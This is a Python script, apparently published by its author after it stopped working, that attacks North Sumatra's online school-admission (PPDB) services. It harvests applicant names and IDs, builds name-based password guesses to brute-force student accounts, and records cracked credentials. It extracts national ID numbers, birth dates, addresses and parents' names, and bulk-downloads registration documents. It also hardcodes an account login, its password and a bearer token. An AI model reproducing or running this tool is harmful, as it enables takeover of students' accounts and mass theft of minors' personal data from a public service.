#coding: utf-8
#by ExtremeBoy
#Untuk tahun 2024 ini sudah ga bisa
#Jadi di publish aja sourcenya


import requests as r
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor as th
import json,sys,os,random
from datetime import datetime


url="https://apippdb.disdik.sumutprov.go.id:443/web/index.php?r=user/login-akun"
sekolah="https://storage.tukode.shop/psu2023-simulasi/public/sekolah/sekolah.json"
kata=['zonasi-khusus','zonasi','keluarga-tidak-mampu','disabilitas','perpindahan-tugas','anak-guru','tenaga-kesehatan','prestasi-nilai-rapor','lomba-bidang-akademik','lomba-bidang-non-akademik']
URL="https://minio.psu.marsindo.dev/psu2023-simulasi/public/sekolah/data-pendaftar/"
regis="https://adminppdb.disdik.sumutprov.go.id:443/web/index.php?r=registrasi/cetak&id="
CEK="https://ppdb.disdik.sumutprov.go.id:443/src/cek_pendaftar.php?t="
acc="https://minio.psu.marsindo.dev/psu2023-simulasi/public/sekolah/hasil-seleksi/"
url_check="https://apippdb.disdik.sumutprov.go.id:443/web/index.php?r=utility/timeline-peserta&id="
url_check1="https://apippdb.disdik.sumutprov.go.id:443/web/index.php?r=data-dapodik/view&id="
kirai=0
sekarang=datetime.now().strftime("%d-%B-%Y")+".txt"
waktu_lengkap=datetime.now().strftime("%A, %d %B %Y, %H:%M:%S")

#DUMPING
user=[]

def random_crack():
	global gu,dg,dapat,RILL,kirai
	gu=[]
	RILL=[]
	dg=0
	dapat=0
	kirai=0
	hjk=input("> Dumping : ")
	gh=random.randint(800000,890000)
	with th(max_workers=40) as tread:
		for x in range(gh,gh+20000):
			if len(gu)>=int(hjk):
				break
			else:
				tread.submit(dumping_crack,hjk,x)
	sys.stdout.write("\r [✓] DONE DUMPING                  \n");sys.stdout.flush()
	with th(max_workers=32) as thread:
		for d in gu:
			thread.submit(cheCK,d)
	print(gu)
	generate(RILL)

def dumping_crack(jumlah,dft):
	global dg,gu,dapat
	if len(gu)>=int(jumlah):
		pass
	else:
		sys.stdout.write("\r Searching.... "+str(dg)+" | FOUND: "+str(dapat));sys.stdout.flush()
		hj=r.get(url_check1+str(dft),headers={'authorization':'Bearer '+token[0]}).json()
		if hj['data']['file_kk']=='':
			if hj['data']['id_user']=='':
				pass
			else:
				id=hj['data']['id_user']
				w=r.get(url_check+str(id)).json()
				if len(w['data'])==0:
					pass
				elif len(w['data'])==1:
					cok=(w['data'][0]['keterangan'])
					gu.append(cok[-10:])
					dapat+=1
		dg+=1

def cheCK(data):
	global RILL
	cd=r.get(CEK+data).json()
	RILL.append([data,cd[0][0]])

def bearer():
	file_kk="https://ppdb.disdik.sumutprov.go.id:443/"
	ma="1684308729646482f94d5bf7.31062517.jpg"
	data={'authorization':
	'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImp0aSI6IjRmMWcyM2ExMmFhIn0.eyJpc3MiOiJodHRwOlwvXC9leGFtcGxlLmNvbSIsImF1ZCI6Imh0dHA6XC9cL2V4YW1wbGUub3JnIiwianRpIjoiNGYxZzIzYTEyYWEiLCJpYXQiOjE2ODQ0ODcxNzcsImV4cCI6MTY4NDQ5MDc3NywidWlkIjozNjU1ODEsInVzZXJuYW1lIjoiMDA4MjU4NzQxOSJ9.NkrhRIU6LNbPUekx6K_pRaDZs90kNZY-ATZrjsXzFTw'
	}
	print(r.get(file_kk+ma,headers=data).content)

def crack(username,pw,nama,Klengkap):
	global kirai
	kirai+=1
	sys.stdout.write("\rProcessing "+str(kirai));sys.stdout.flush()
	for g in pw:
#		print(g)
		dsta={"username":username,
		"password":g}
		l=(r.post(url,data=dsta).json())
		if 'message' in l:
			pass
		else:
			if Klengkap=="yes":
				yuu=show_us_more(l)
				sys.stdout.write("\rID : "+username+"             \nPW : "+g+"\n"+yuu+"\n\n");sys.stdout.flush()
			else:
				sys.stdout.write("\r+>> "+username+" | "+g+"\n   |__ "+nama+"\n\n");sys.stdout.flush()
			file=open("result/"+sekarang,'a')
			file.write(username+" | "+g)
			file.close()
			break

def show_us_more(nyu):
	Valid="https://apippdb.disdik.sumutprov.go.id:443/web/index.php?r=user/validate-token&token="+nyu['token']
	valid="https://apippdb.disdik.sumutprov.go.id:443/web/index.php?r=data-dapodik/view&id="
	push={'authorization':'Bearer '+nyu['token']}
	email=nyu['data']['email']
	cari=r.get(Valid,headers=push).json()
	Cari=r.get(valid+str(cari['data']['id_data_kk']),headers=push).json()
	nama,ttl,nik,alamat,ayah,ibu=Cari['data']['nama'],Cari['data']['tanggal_lahir'],Cari['data']['nik'],Cari['data']['alamat'],Cari['data']['nama_ayah'],Cari['data']['nama_ibu']
	tabel=f"""\033[0;96m+++++++++++++++++++++++++++\033[0m
Nama   : {nama}
TTL    : {ttl}
Email  : {email}
NIK    : {nik}
Alamat : {alamat}
Ayah   : {ayah}
Ibu    : {ibu}
\033[0;96m+++++++++++++++++++++++++++\033[0m"""
	return tabel

def skulah():
	global user,oi,ink
	w=r.get(sekolah).json()
	ink=int(input("> How Many: "))
	oi=0
	with th(max_workers=30) as tread:
		ahok=[]
		for x in w:
			if oi>=ink:
				pass
			else:
				for v in kata:
					tread.submit(dskulah,x,v)
	iJK=input("\r> Show More Info? (Y/N) : ")
	if iJK in ["Y","y"]:
		show_more="yes"
	else:
		show_more="no"
	generate(user,show_more)

def target():
	global oi,user,ink,kata
	ink=int(input("> Target ID: "))
	oi=0
	with th(max_workers=30) as tread:
		for v in kata:
			tread.submit(dskulah,ink,v)

	iJK=input("\r> Show More Info? (Y/N) : ")
	if iJK in ["Y","y"]:
		show_more="yes"
	else:
		show_more="no"
#	USer=[]
#	USer.append(["0085629377","AIDI ANTONUO"])
	generate(user,show_more)

def dskulah(x,v):
	global oi,ink
	try:
	#x['id']
		if oi>=ink:
			pass
		else:
			try:
				t=x['id']
			except:
				t=x
			d=r.get(URL+str(t)+'-'+v+'.json').json()
			sys.stdout.write("\rDumping "+str(oi));sys.stdout.flush()
#			print(d)
			for c in d:
				id=c[2]
				name=c[3]
				if oi>=ink:
					pass
				else:
					user.append([id,name,c[1]])
					oi+=1
	except r.exceptions.JSONDecodeError:pass
	return True

def generate(user,show_more):
	global kirai
	g=['123','1234','12345','321','213','132']
	with th(max_workers=35) as tread:
		for namee in user:
			data=[]
#			print(namee)
			name=namee[1]
			if name==None:
				pass
			else:
				id=namee[0]
#		print(id+name)
				for a in name.split(' '):
					for j in g:
						data.append(a.lower()+j)
				cekkk=name.split(' ')
				data.append(' '.join(cekkk).lower())
				if len(cekkk)==3:
					data.append(''.join(cekkk).lower())
					for j in g:
						data.append(cekkk[0].lower()+cekkk[1].lower()+j)
						data.append(cekkk[0].lower()+cekkk[1].lower())
						data.append(cekkk[1].lower()+cekkk[2].lower()+j)
						data.append(cekkk[1].lower()+cekkk[2].lower())
						data.append(''.join(cekkk).lower()+j)
				elif len(cekkk)==4:
					data.append(''.join(cekkk).lower())
					for j in g:
						data.append(cekkk[0].lower()+cekkk[1].lower()+j)
						data.append(cekkk[0].lower()+cekkk[1].lower())
						data.append(cekkk[1].lower()+cekkk[2].lower()+j)
						data.append(cekkk[1].lower()+cekkk[2].lower())
						data.append(cekkk[2].lower()+cekkk[3].lower()+j)
						data.append(cekkk[2].lower()+cekkk[3].lower())
						data.append(''.join(cekkk).lower()+j)
				elif len(cekkk)==2:
					data.append(''.join(cekkk).lower())
					for j in g:
						data.append(cekkk[0].lower()+cekkk[1].lower()+j)
						data.append(cekkk[0].lower()+cekkk[1].lower())
						data.append(''.join(cekkk).lower()+j)
				elif len(cekkk)==5:
					data.append(''.join(cekkk))
					for j in g:
						data.append(cekkk[0].lower()+cekkk[1].lower()+j)
						data.append(cekkk[0].lower()+cekkk[1].lower())
						data.append(cekkk[1].lower()+cekkk[2].lower()+j)
						data.append(cekkk[1].lower()+cekkk[2].lower())
						data.append(cekkk[2].lower()+cekkk[3].lower()+j)
						data.append(cekkk[2].lower()+cekkk[3].lower())
						data.append(cekkk[3].lower()+cekkk[4].lower()+j)
						data.append(cekkk[3].lower()+cekkk[4].lower())
						data.append(''.join(cekkk).lower()+j)
				else:pass
				tread.submit(crack,id,data,name,show_more)

def dump_sekolah():
	w=r.get(sekolah).json()
	f=open("sekolah.json","w")
	f.write(json.dumps(w))
	f.close()

def cari_id(id):
# CONTOH RESULT
#{'bentuk_pendidikan': 'SMK', 'jurusan': 'Teknik Instalasi Tenaga Listrik', 'npsn': '10264642', 'nama': 'SMK NEGERI 5 TANJUNGBALAI', 'alamat': 'JL. SRIWIJAYA ', 'kabupatenkota': 1272, 'kabupatenkotanama': 'KOTA TANJUNG BALAI', 'koordinat': '2.939,99.780300', 'kodepos': '-', 'telp': '', 'email': '-', 'website': '', 'zonasi_jarak': 4, 'keluarga_tidak_mampu': 6, 'disabilitas': 1, 'perpindahan_tugas': 1, 'anak_guru': 1, 'tenaga_kesehatan': 0, 'prestasi_nilai_akademik': 21, 'lomba_akademik': 1, 'lomba_nonakademik': 1, 'total_kuota': 36, 'id': 690, 'text': 'SMK NEGERI 5 TANJUNGBALAI - Teknik Instalasi Tenaga Listrik - KOTA TANJUNG BALAI'}
	f=open("sekolah.json").read()
	f=json.loads(f)
	for x in f:
		if str(x['id'])==id:
			print(x)

def search():
	global oi,found
	w=r.get(sekolah).json()
	oi=0
	found=0
	hw=input("> Search name : ")
	show=input("> Show More Info? (Y/N) : ")
	with th(max_workers=32) as tread:
		for x in w:
			for v in kata:
				tread.submit(searching,x,v,hw,show)

def main():
	print(" 1. Crack Random\n 2. Crack Target (id)\n 3. Search Name\n 4. Search Name ID\n 5. Cari ID\n 6. Dumping FILES (target id)\n 7. Dumping FILES (all)\n 8. Lihat Info (ID)\n 9. Lihat Info Pendaftar PPDB Sekolah\n 10. Check User Register\n 11. Search Nama Sekolah\n 12. Cek Jarak Zonasi (all)\n 13. Cek Jarak Zonasi (id)\n")
	hjk=int(input("> Menu : "))
	if hjk==1:
		skulah()
	elif hjk==2:
		target()
	elif hjk==3:
		search()
	elif hjk==4:
		Cari()
	elif hjk==5:
		CariS()
	elif hjk==6:
		ceku=True
		dumping(ceku)
	elif hjk==7:
		ceku=False
		dumping(ceku)
	elif hjk==8:
		informasi()
	elif hjk==9:
		informasi_sekolah()
	elif hjk==10:
		dumpingS()
	elif hjk==11:
		SklH()
	elif hjk==12:
		val=False
		Zona(val)
	elif hjk==13:
		val=True
		Zona(val)

def Zona(ceki):
	print("> b : Besar\n> k : Kecil")
	besar=input("> Dari Terbesar atau Terkecil? (b/k) : ")
	if ceki==True:
		u=input("> Target ID : ")
		for s in u.split(","):
			ZonaS(s,besar)
	elif ceki==False:
		u=input("> Jarak minimal (meter) : ")
		ZonaK(u,besar)

def ZonaK(jarak,kbsar):
	h=json.loads(open("sekolah.json").read())
	oku=1
	print("")
	for x in h:
		try:
			checki=r.get(URL+str(x['id'])+"-zonasi.json").json()
			for a in checki:
				if int(a[4])>=int(jarak):
					oiu=r.get(CEK+str(a[2])).json()
					formut="\r"+str(oku)+". "+a[3]+"\n   \033[0;92m+\033[0m Jarak : "+a[4]+"\n   \033[0;92m+\033[0m NISN  : "+a[2]+"\n   \033[0;92m+\033[0m ID    : "+str(a[1])+"\n   \033[0;92m+\033[0m Koor  : "+oiu[0][3]+"\n\n"
					print(formut)
					oku+=1
		except r.exceptions.JSONDecodeError:pass
def ZonaS(idzz,kbsar):
	if kbsar.lower()=="b":
		hok=True
	else:
		hok=False
	hg=r.get(URL+str(idzz)+"-zonasi.json").json()
	kecil=[]
	sd=sorted(hg,key=lambda x:int(x[4]),reverse=hok)
	u=1
	p=0
	print("")
	for a in sd:
#		oiu=r.get(CEK+str(a[2])).json()
		formut="\r"+str(u)+". "+a[3]+"\n   \033[0;92m+\033[0m Jarak : "+a[4]+"\n   \033[0;92m+\033[0m NISN  : "+a[2]+"\n   \033[0;92m+\033[0m ID    : "+str(a[1])+"\n   \033[0;92m+\033[0m Koor  : "+"###"+"\n\n"
		print(formut)
		if u==p+10:
			gfg=input("Tampilkan lagi? (y/n) : ")
			if gfg.lower()=="y":
				p+=10
				u+=1
				continue
			else:
				break
		u+=1
def namaSekolah(id):
	w=open("sekolah.json").read()
	jk=json.loads(w)
	for i in jk:
		if str(id)==i['id']:
			return i['nama']

def SklH():
	inl=input("> Nama Sekolah : ")
	t=open("sekolah.json").read()
	jk=json.loads(t)
	for i in jk:
		if inl.lower() in i['nama'].lower():
			print("ID > "+str(i['id'])+"\nNAMA > "+i['nama'].upper()+"\n")


def dumpingS():
	idz=input("> Target Sekolah : ")
	more=input("> Show More Info (y/n) : ")
	o=0
	for j in kata:
		try:
			cek=r.get(URL+str(idz)+"-"+j+".json").json()
			for i in cek:
				id=i[2]
				y=("+>> "+i[3]+" | "+i[2]+"\n    |___ "+str(i[1])+"\n")
				if more.lower()=="y":
					L=targetin(id)
					print(y+L)
				else:
					print(y+"\n")
				o+=1
		except r.exceptions.JSONDecodeError:pass
	print("> Total : "+str(o))

def informasi():
	idz=input("> Target IDz : ")
	for g in idz.split(','):
		print(targetin(g))



def informasi_sekolah():
	idz=input("> Target ID : ")
	aku=[]
	for v in kata:
		try:
			gh=r.get(URL+str(idz)+'-'+v+'.json').json()
			for x in gh:
				aku.append(x[2])
		except r.exceptions.JSONDecodeError:pass
	for j in aku:
		waduh=targetin(j)
		print(waduh)

def targetin(idf):
	hj=r.get(CEK+str(idf)).json()
	nama,regis,gender,coor,daftar,pend,jalur,sekolah,dinas,tolak,tujuan=hj[0]
	return ("\033[0;96m++++++++++++++++++++++++++++\033[0m\n Nama           : "+nama+"\n No. Reg        : "+regis+"\n Kelamin        : "+gender+"\n Koordinat      : "+coor+"\n Tgl. Daftar    : "+daftar+"\n Pendidikan     : "+pend+"\n Jalur          : "+jalur+"\n Verif. Sekolah : "+sekolah+"\n Verif. Dinas   : "+dinas+"\n Status Tolak   : "+tolak+"\n Tujuan Sekolah : "+tujuan+"\n\033[0;96m++++++++++++++++++++++++++++\033[0m\n\n")
#	sys.stdout.flush()

def dumping(ceku):
	inl=input("> Acc? (y/n) : ")
	if inl.lower()=="y":
		coy=input("> ID : ")
		ceh=cheking_id(coy,True)
		dumpGG(coy,ceh)
	else:
		if ceku==True:
			ghe=input("> ID : ")
			for x in ghe.split(','):
				ceh=cheking_id(x,False)
				dumpG(x,ceh)
		else:
			dump_all()

def dumpGG(aA,bB):
	global cokk
	cokk=0
	d=r.get(acc+aA+".json").json()
	with th(max_workers=30) as tread:
		for g in d:
			id=g[1]
			nama=g[2]
			tread.submit(dumpH,nama,"",bB,id)

def cheking_id(kek,cuyy):
	i=r.get(sekolah).json()
	if cuyy==True:
		for h in i:
			if str(h['id'])==kek:
				heh=h['nama']
				try:os.mkdir(heh+" - ACC")
				except:pass
				return heh+" - ACC"
	else:
		for h in i:
			if str(h['id'])==kek:
				heh=h['nama']
				try:os.mkdir(heh)
				except:pass
				return heh

def dumpG(target,ceh):
	global cokk
	cokk=0
	with th(max_workers=30) as tread:
		for jk in kata:
			try:
				d=r.get(URL+str(target)+'-'+jk+'.json').json()
				for c in d:
					name=c[3]
					id=c[2]
					idz=c[1]
					tread.submit(dumpH,name,id,ceh,idz)
			except r.exceptions.JSONDecodeError:pass

def dumpH(nama,id,ceh,idz):
	global cokk
	cokk+=1
	sys.stdout.write("\r> Dumping "+str(cokk)+" ");sys.stdout.flush()
	kl=r.get(regis+str(idz)).content
	if nama[-1]==" ":
		nama=nama[:-1]
	lek=open(ceh+"/"+nama+".pdf",'wb')
	lek.write(kl)
	lek.close()


def dump_all():
	w=r.get(sekolah).json()

def Cari():
	w=input("> ID : ")
	cari_id(w)

def searching(x,v,name,show):
	global oi,found
	try:
		d=r.get(URL+str(x['id'])+'-'+v+'.json').json()
		sys.stdout.write("\r> Searching {} | Found:{}{}{} ".format(oi,"\033[0;92m",found,"\033[0m"));sys.stdout.flush()
		for gh in d:
			nm=gh[3]
			for h in name.split(","):
				if h.lower() in nm.lower():
					jk=nm.upper().replace(h.upper(),"\033[0;92m"+h.upper()+"\033[0m")
					if x['nama'][:3]=="SMK":
						if show.lower()=='y':
							jkt=targetin(gh[2])
							sys.stdout.write("\r+>>> "+jk+" | "+gh[2]+"     \n    |__ "+x['nama']+"\n      |__ "+x['jurusan']+"\n"+jkt);sys.stdout.flush()
						else:
							sys.stdout.write("\r+>>> "+jk+" | "+gh[2]+"     \n    |__ "+x['nama']+"\n      |__ "+x['jurusan']+"\n\n");sys.stdout.flush()
					if show.lower()=='y':
						jkt=targetin(gh[2])
						sys.stdout.write("\r+>>> "+jk+" | "+gh[2]+"     \n    |__ "+x['nama']+"\n"+jkt);sys.stdout.flush()
					else:
						sys.stdout.write("\r+>>> "+jk+" | "+gh[2]+"     \n    |__ "+x['nama']+"\n      |__ "+x['jurusan']+"\n\n");sys.stdout.flush()
					found+=1
			oi+=1
	except r.exceptions.JSONDecodeError:pass

def login():
	global token
	token=[]
	w=r.post("https://apippdb.disdik.sumutprov.go.id:443/index.php?r=user/login-akun",data={'username':'0086879980','password':'zaskiah1234'}).text
	print(w)
	if w['token']:
		simpelajh="[\033[0;92m+\033[0m]"
		token.append(w['token'])
		print("Welcome User \033[0;92m"+w['data']['nama']+"\033[0m")
		print("[\033[0;92m+\033[0m] Server Online!")
		print(simpelajh+" Time : "+waktu_lengkap+"\n")
	else:
		exit("Error")


if __name__=="__main__":
#	e=r.get("https://apippdb.disdik.sumutprov.go.id:443/web/index.php?r=data-dapodik/view&id=389544",headers=bear).json()
#	print(e)
	login()
	main()
#	random_crack()
